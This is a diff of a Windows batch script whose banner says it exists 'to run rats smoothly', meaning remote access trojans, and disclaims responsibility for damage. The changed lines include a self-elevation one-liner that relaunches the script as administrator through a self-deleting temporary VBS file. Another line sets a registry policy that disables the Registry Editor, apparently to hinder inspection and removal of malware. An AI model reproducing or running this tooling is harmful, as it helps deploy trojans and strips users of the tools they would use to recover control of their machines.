@@ -1,8 +1,8 @@
 @echo off
-net sess>nul 2>&1||(echo(CreateObject("Shell.Application"^).ShellExecute"%~0",,,"RunAs",1:CreateObject("Scripting.FileSystemObject"^).DeleteFile(wsh.ScriptFullName^)>"%temp%\%~nx0.vbs"&start wscript.exe "%temp%\%~nx0.vbs"&exit))
+net sess>nul 2>&1||(echo(CreateObject("Shell.Application"^).ShellExecute"%~0",,,"RunAs",1:CreateObject("Scripting.FileSystemObject"^).DeleteFile(wsh.ScriptFullName^)>"%temp%\%~nx0.vbs"&start wscript.exe "%temp%\%~nx0.vbs"&exit)
 
 echo ------------------------------------------------------------------------------------
-echo                       Created by @Asphyxia on Discord, 7/31/2024                    
+echo                        Created by @Asphyxia on GitHub, 8/3/2024                    
 echo                This script is used to run rats smoothly with no issues. 
 echo               I'm not responsible for the damages caused in this script.
 echo                   Please run at your own risk! Use VM if necessary.                
@@ -62,7 +62,7 @@ if %errorlevel% neq 0 (
 )
 
 timeout /t 1 >NUL
-echo Yes | reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f > NUL 2>&1
+echo Yes | reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f > NUL 2>&1
 if %errorlevel% neq 0 (
     echo Failed to disable Registry Editor.
     echo,
